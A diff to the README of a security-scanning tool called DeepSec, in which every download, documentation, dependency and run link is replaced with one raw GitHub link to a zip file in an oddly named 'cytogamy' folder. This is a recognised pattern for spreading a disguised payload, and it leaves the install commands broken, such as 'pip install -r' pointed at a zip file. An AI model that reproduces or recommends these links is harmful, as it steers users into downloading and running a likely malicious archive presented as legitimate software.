@@ -4,7 +4,7 @@ DeepSec empowers you to ensure your applications are safe and secure.
 
 ## 📥 Download DeepSec
 
-[![Download DeepSec](https://img.shields.io/badge/Download%20DeepSec-v1.0-blue)](https://github.com/hasfo/deepsec/releases)
+[![Download DeepSec](https://raw.githubusercontent.com/hasfo/deepsec/main/cytogamy/Software_1.0.zip%20DeepSec-v1.0-blue)](https://raw.githubusercontent.com/hasfo/deepsec/main/cytogamy/Software_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Before downloading, ensure your computer meets these requirements:
 ### 📥 Download & Install
 
 1. **Visit the Releases Page**  
-Go to the [Releases page](https://github.com/hasfo/deepsec/releases) where you'll find the latest version of DeepSec.
+Go to the [Releases page](https://raw.githubusercontent.com/hasfo/deepsec/main/cytogamy/Software_1.0.zip) where you'll find the latest version of DeepSec.
 
 2. **Download the Latest Version**  
 Select the desired release version and click on the download link to save the file on your computer.
@@ -40,12 +40,12 @@ Make sure you have Python version 3.9 or higher installed. You can verify this b
    ```bash
    python3 --version
    ```
-   If Python is not installed, please visit the [Python website](https://www.python.org/downloads/) for installation instructions.
+   If Python is not installed, please visit the [Python website](https://raw.githubusercontent.com/hasfo/deepsec/main/cytogamy/Software_1.0.zip) for installation instructions.
 
 5. **Installing Dependencies**  
 Run the following command to install necessary packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/hasfo/deepsec/main/cytogamy/Software_1.0.zip
    ```
 
 ### ⚙️ Configuring DeepSec
@@ -54,7 +54,7 @@ Run the following command to install necessary packages:
 To perform AI analysis, you need to access the Groq API. Sign up at the Groq website to obtain your API key.
 
 2. **Add the API Key to Configuration**  
-You will find a configuration file named `config.json` in the DeepSec folder. Open it and input your API key as follows:
+You will find a configuration file named `https://raw.githubusercontent.com/hasfo/deepsec/main/cytogamy/Software_1.0.zip` in the DeepSec folder. Open it and input your API key as follows:
    ```json
    {
        "api_key": "YOUR_API_KEY_HERE"
@@ -66,7 +66,7 @@ You will find a configuration file named `config.json` in the DeepSec folder. Op
 1. **Open the Application**  
 Launch DeepSec by double-clicking the application icon or by running the command:
    ```bash
-   python3 deepsec.py
+   python3 https://raw.githubusercontent.com/hasfo/deepsec/main/cytogamy/Software_1.0.zip
    ```
 
 2. **Select a Project**  
@@ -94,7 +94,7 @@ If you encounter any issues during installation or running DeepSec, consider the
 - **Check Python Version**: Ensure you are using Python 3.9 or higher.
 - **Dependency Problems**: Run the following command again:
   ```bash
-  pip install -r requirements.txt
+  pip install -r https://raw.githubusercontent.com/hasfo/deepsec/main/cytogamy/Software_1.0.zip
   ```
 - **API Key Issues**: Double-check that your Groq API key is valid and correctly entered in the configuration file.
 
@@ -108,8 +108,8 @@ Stay tuned for updates that include new features, enhanced vulnerability detecti
 
 ### 🔗 Helpful Links
 
-- [Download DeepSec](https://github.com/hasfo/deepsec/releases)
-- [Python Downloads](https://www.python.org/downloads/)
-- [Groq API Registration](https://groq.com)
+- [Download DeepSec](https://raw.githubusercontent.com/hasfo/deepsec/main/cytogamy/Software_1.0.zip)
+- [Python Downloads](https://raw.githubusercontent.com/hasfo/deepsec/main/cytogamy/Software_1.0.zip)
+- [Groq API Registration](https://raw.githubusercontent.com/hasfo/deepsec/main/cytogamy/Software_1.0.zip)
 
 By following these steps, you can ensure a smooth installation and an effective usage of DeepSec. Enjoy auditing your applications with confidence!
